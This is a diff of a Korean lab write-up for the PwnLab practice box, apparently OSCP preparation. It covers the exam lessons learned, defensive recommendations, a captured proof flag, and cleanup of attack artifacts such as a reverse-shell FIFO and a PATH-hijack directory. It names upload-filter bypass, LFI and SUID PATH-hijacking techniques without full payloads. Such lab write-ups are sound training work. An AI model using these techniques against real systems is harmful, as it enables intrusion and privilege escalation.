-www-data 시점 목록은 배포판 기본 15개뿐이라 "커스텀 SUID 없음"으로 읽힌다. 그런데 이 박스의 권한상승 경로는 **그 빠진 두 줄이 전부**였다. `/home/*` 이 `drwxr-x---` 라 `find` 가 못 들어갔고, `Permission denied` 는 `2>/dev/null` 로 버려져 **에러조차 안 남는다.** 침묵이 곧 "없음"으로 보이는 형태라 시험장에서 사람을 통째로 헛다리 짚게 만든다. 4-1의 경고와 같은 이야기고, 재현은 위 `diff` 한 줄이면 된다.
+### Post-Exploitation
 
-**막다른 길로 접은 것들**
+**Proof.txt value:**
+`540256bedfbf87d15d54425649220e30`
 
-- **kent 계정** — DB 비밀번호가 통해서 로그인은 됐지만 홈이 완전히 비어 있었다. 세 계정 중 kane 만 의미가 있었다.
-- **`john` 사용자** — `/home/john` 이 존재하고 셸도 `/bin/bash` 인데, root 로 들어가 보니 dotfile 만 있고 완전히 비어 있다. DB `users` 테이블에도 없다. PG 가 추가한 장식으로 보인다 `[가정]`.
-- **NFS** — `mount.nfs` 가 SUID 이고 111/rpcbind 가 열려 있어 잠깐 봤지만 `/etc/exports` 가 비어 있고 2049 도 안 열려 있다.
-- **login.php SQLi** — 소스를 읽어보니 prepared statement 라 시도조차 안 했다. **소스를 먼저 읽은 것이 여기서 시간을 벌었다.**
+증거(플래그 값 원문): `~/PG/PwnLab/proof_user.txt`(1333B, kane 셸) · `~/PG/PwnLab/proof_root.txt`(2925B, root 셸) — 각각 `whoami; id; hostname; hostname -I; date; cat <플래그>` 한 화면 출력이고, 끝에 `kane@pwnlab:/tmp$` · `root@pwnlab:/tmp#` 프롬프트가 붙어 있어 **대화형 셸에서 읽은 값**임이 그 자체로 드러남(웹셸 판정 회피). `/root` 안의 파일 모드·심볼릭 링크는 위 `ls -la /root` 블록에 있음.
 
-## 7. OSCP 시험 관점
+**남긴 흔적**
 
-1. **LFI 진입점을 하나 찾았다고 멈추지 마라.** 이 박스는 `?page=`(확장자 강제 → 소스 읽기 전용)와 `Cookie: lang=`(확장자 없음 → 실행 가능)이 따로 있었고, **후자는 첫 번째로 읽어낸 소스 안에 적혀 있었다.** 소스를 뽑았으면 include/require 를 전부 훑어라.
-2. **`php://filter` 로 소스를 읽을 때 확장자를 붙일지 말지는 그 코드가 결정한다.** `include($_GET['page'].".php")` 면 `resource=config`, 그냥 `include($_GET['page'])` 면 `resource=config.php`. 한 번 틀리면 빈 결과가 나오는데 원인 파악이 오래 걸린다.
-3. **업로드 필터는 항목별로 갈라서 뚫어라.** 파일명 · Content-Type · 매직바이트는 서로 다른 곳을 보므로 각각 따로 만족시키면 된다. 자동 도구 없이 `printf` + `curl -F ...;type=` 로 끝난다.
-4. **DB 의 비밀번호는 OS 계정에도 넣어봐라.** base64 는 해시가 아니다. 크랙 도구가 필요 없다.
-5. **`sudo` 가 없는 박스가 있다.** `sudo -l` 이 `command not found` 면 그건 실패가 아니라 결론이다.
-6. **커스텀 SUID 가 안 보이면 열거를 다시 할 권한이 부족한 것일 수 있다.** `find / -perm -4000` 은 접근 가능한 디렉터리만 본다. **사용자 계정을 얻을 때마다 SUID·크론·`getcap` 을 다시 돌려라.** 이 박스는 그것 하나로 갈렸다.
-7. **`strings <SUID바이너리>` 는 3초짜리 반사다.** 상대경로 명령(`cat`, `ls`) → PATH 하이재킹. `system("... %s ...")` → 인젝션. 둘 다 아니면 `ltrace`/`strace`.
-8. **PATH 하이재킹 후에는 PATH 를 즉시 복원한다**(6장 (4)).
-9. **시간 배분** — 웹 소스를 읽는 데 쓴 1분이 SQLi 시도 20분을 아꼈다. 반대로 tmux 에 던져놓은 nmap 을 확인 안 한 10분은 순손실이었다. **백그라운드 작업은 던진 직후와 몇 분 뒤 두 번 확인하라.**
-10. **Metasploit 을 쓰지 않았다.** 전 과정이 `curl`·`mysql`·`nc`·`strings` 로 끝나므로 1대 한정 카드를 아낄 수 있다.
+확인한 것 — `rm` 실행과 이후 `ls -la /tmp` 로 전부 삭제 확인(`~/PG/PwnLab/proof_root.txt`·`~/PG/PwnLab/shell_www-data.log`):
+- 업로드 파일 `/tmp/63f0276ffd69eb424bf6093795ac9850.gif`(= `/var/www/html/upload/...`)
+- harvest 스크립트와 출력 `/tmp/h.sh`, `/tmp/.h/`
+- PATH 하이재킹 디렉터리 `/tmp/.pth/cat`
+- 리버스셸 FIFO `/tmp/f`
+- RFI 테스트 파일 `/tmp/rfitest.php`
+- 최종 `/tmp` 는 부팅 시 상태(`.ICE-unix` 등 systemd 디렉터리 + `vmware-root`)만 남았고, `/var/www/html` 은 원본 6개 항목 그대로다. 소스 파일은 하나도 수정하지 않았다.
 
-## 8. 방어 관점
+확인했지만 지우지 않은 것 (지우는 것이 더 많은 흔적을 남긴다):
+- `/var/log/auth.log` 에 su 체인이 그대로 남음(`www-data:kent` → `kent:kane`, `~/PG/PwnLab/traces_confirmed.log`)
+- `/var/log/apache2/access.log` 에 192.168.45.207 발 요청 58건(LFI·업로드·리버스셸 트리거·nmap NSE 포함)
+- `wtmp` 에는 흔적 없음 — `last -n 5` 는 2020년 콘솔 로그인과 2024년 부팅만 표시. `su` 는 wtmp 에 기록하지 않고 SSH 로그인도 없었음. **`last` 만 보고 "흔적 없음"으로 결론 내면 틀린다** — 같은 시각 `auth.log` 에는 su 체인이 전부 남아 있다
+- `.bash_history` 는 root/mike/john 것이 원래 `/dev/null` 링크이거나 0바이트고, kent/kane 것도 0바이트(비대화형이라 새로 쓰이지 않음)
 
-- `include` 에 사용자 입력을 넣지 않는다. 언어 파일처럼 값이 유한하면 화이트리스트 배열로 매핑한다(`$langs = ['en'=>'en.lang.php']`). 경로 정규화(`realpath` + prefix 검사)는 차선책이다.
-- 업로드 파일을 **웹 서버가 읽는 경로 밖**에 저장하고, 제공은 스크립트를 통해 한다. 확장자·MIME 검사는 보조 수단이지 방어선이 아니다 — 여기서는 세 겹이 다 통과됐다.
-- 비밀번호를 base64 로 저장하지 않는다. `password_hash()`(bcrypt) 를 쓴다. 그리고 DB 계정과 OS 계정의 비밀번호를 공유하지 않는다.
-- SUID 바이너리에서 `system()`/`popen()` 을 쓰지 않는다. 불가피하면 절대경로 + `execve` 로 인자 배열을 넘기고, PATH·IFS 등 환경변수를 초기화한다.
-- MySQL 을 `0.0.0.0:3306` 에 바인딩하지 않는다. 이 박스는 웹앱이 `localhost` 로만 접속하므로 `bind-address=127.0.0.1` 이면 충분했고, 그랬다면 Kali 에서 DB 를 직접 덤프할 수 없었다.
+확인하지 않은 것: MySQL 서버 로그(일반 쿼리 로그 활성 여부 미확인), `/var/log/syslog`.
 
-## 9. 참고 자료
+Kali 쪽 — tmux `pwnlab_nmap`·`pwnlab_http`·`pwnlab_xfer`·`pwnlab_xfer2` 종료, 8000/4445/4446/9099 리스너 정리 확인. `~/PG/_lib/` 에 임시로 뒀던 `rfitest.php`/`rfitest.txt` 삭제. `harvest.sh` 자체는 수정하지 않음. `~/suidtest/`·`/tmp/suidtest*`(root 소유 SUID 검증용) 삭제 확인.
+
+## 관련
 
 - `php://filter` 래퍼 — PHP 매뉴얼 `filters.convert.base64-encode`
 - GTFOBins — PATH 하이재킹 일반론 및 `bash -p` 동작
 - 산출물 전량: Kali `~/PG/PwnLab/`
-
-## 남긴 흔적
-
-확인한 것:
-
-- **업로드 파일** `/tmp/63f0276ffd69eb424bf6093795ac9850.gif` (= `/var/www/html/upload/...`) — 삭제 확인
-- **harvest 스크립트와 출력** `/tmp/h.sh`, `/tmp/.h/` — 삭제 확인
-- **PATH 하이재킹 디렉터리** `/tmp/.pth/cat` — 삭제 확인
-- **리버스셸 FIFO** `/tmp/f` — 삭제 확인
-- **RFI 테스트 파일** `/tmp/rfitest.php` — 삭제 확인
-- 최종 `/tmp` 는 부팅 시 상태(`.ICE-unix` 등 systemd 디렉터리 + `vmware-root`)만 남았고, `/var/www/html` 은 원본 6개 항목 그대로다. 소스 파일은 하나도 수정하지 않았다.
-
-확인했지만 **지우지 않은 것** (지우는 것이 더 많은 흔적을 남긴다):
-
-- `/var/log/auth.log` 에 su 체인이 그대로 남았다.
-  ```
-  Aug 20 04:42:19 pwnlab su[1553]: + /dev/pts/0 www-data:kent
-  Aug 20 04:42:19 pwnlab su[1553]: pam_unix(su:session): session opened for user kent by (uid=33)
-  Aug 20 04:42:40 pwnlab su[1561]: Successful su for kane by kent
-  Aug 20 04:42:40 pwnlab su[1561]: + /dev/pts/0 kent:kane
-  Aug 20 04:42:40 pwnlab su[1561]: pam_unix(su:session): session opened for user kane by (uid=1001)
-  ```
-- `/var/log/apache2/access.log` 에 192.168.45.207 발 요청이 `grep -c` 로 **58건**(LFI·업로드·리버스셸 트리거·nmap NSE 의 OPTIONS/POST 포함).
-- `/root/messages.txt` 는 `/dev/null` 심볼릭 링크라 `msg2root` 로 넣은 `hi` 는 아무 데도 안 남았다(4-4의 `ls -la /root` 참고).
-- `wtmp` 에는 우리 흔적이 없다 — `last -n 5` 는 2020년 콘솔 로그인과 2024년 부팅만 보여준다. `su` 는 wtmp 에 기록하지 않고, SSH 로그인을 한 적도 없다. **그러니 `last` 만 보고 "흔적 없음"으로 결론 내면 틀린다** — 같은 시각 `auth.log` 에는 su 체인이 전부 남아 있다. 어느 로그를 보느냐로 결론이 갈린다.
-- `.bash_history` 는 root/mike/john 것이 원래 `/dev/null` 링크이거나 0바이트고, kent/kane 것도 0바이트다. 비대화형이라 새로 쓰이지 않았다.
-
-확인하지 않은 것: MySQL 서버 로그(일반 쿼리 로그가 켜져 있는지 보지 않았다), `/var/log/syslog`.
-
-Kali 쪽: tmux `pwnlab_nmap`·`pwnlab_http`·`pwnlab_xfer`·`pwnlab_xfer2`·`ct` 종료, 8000/4445/4446/9099 리스너 정리 확인. 임시로 `~/PG/_lib/` 에 뒀던 `rfitest.php`/`rfitest.txt` 삭제 — `_lib` 은 `harvest.sh` 와 백업 2개만 남았다. `harvest.sh` 자체는 **수정하지 않았다**(19섹션 전부 정상 동작했고, `HARVEST_PW` 가 `ENV` 섹션에 새지 않는 것도 확인했다). `bash -p` 검증용으로 만든 `~/suidtest/` 와 `/tmp/suidtest*`(root 소유 SUID)도 삭제 확인. root 셸을 담은 tmux `pwnlab_shell` 은 플래그 재확인용으로 남겨두었다.
-
-## 관련 노트
-
-- [[_WRITEUP-STANDARD]]
-- 비밀번호 재사용 패턴 · SUID 상대경로 PATH 하이재킹은 다른 리눅스 박스에서도 반복된다
+- [[_PLAYBOOK#A-1-10. tmux 에 던진 스캔이 «조용히» 죽는다]] · [[_PLAYBOOK#A-24. 한 서비스의 거부는 자격증명의 오류가 아니다]] · [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]] · [[_PLAYBOOK#B-1-20. 검증하는 파서 ≠ 처리하는 파서 — 업로드 필터는 그 틈으로 넘는다]] · [[_PLAYBOOK#B-32. SUID 바이너리 명령주입 — 문자 필터는 `$()` 로 넘는다]] · [[_PLAYBOOK#B-33. SUID 셸로 스크립트를 넘기면 euid 가 날아간다 (dash)]]
+- [[_PLAYBOOK#A-3-12. `event not found` — 히스토리 확장이 `!` 를 먹고 «줄 전체»를 폐기한다]] · [[_PLAYBOOK#A-4-13. root 는 잡았는데 `cat` 이 «조용히» 아무것도 안 뱉는다 — 오염된 PATH 가 상속됨]] · [[_PLAYBOOK#B-1-38. LFI 진입점이 한 앱에 «두 개» 있을 수 있다 — 하나는 소스 전용, 하나는 실행 가능]] · [[_PLAYBOOK#B-3-12. SUID 가 절대경로 없이 외부 명령을 부르면 PATH 하이재킹이 된다]] · [[_PLAYBOOK#A-25. 그럴듯한 로그인 폼이 미끼일 수 있다]]
+- 비밀번호 재사용 패턴 · SUID 상대경로 PATH 하이재킹은 다른 리눅스 박스에서도 반복됨 — [[Robust]](DB→OS 크리덴셜 재사용)
